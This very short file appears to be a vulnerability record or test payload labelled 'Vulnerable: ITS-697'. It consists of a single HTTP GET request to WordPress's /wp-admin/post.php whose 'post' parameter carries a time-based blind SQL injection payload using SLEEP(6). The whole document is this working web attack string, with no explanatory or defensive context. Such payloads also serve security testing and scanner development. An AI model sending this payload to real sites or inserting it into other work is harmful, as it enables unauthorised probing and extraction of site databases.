# Vulnerable: ITS-697
GET /wp-admin/post.php?post=1+AND+(SELECT+6205+FROM+(SELECT(SLEEP(6)))RtRs)&action=edit
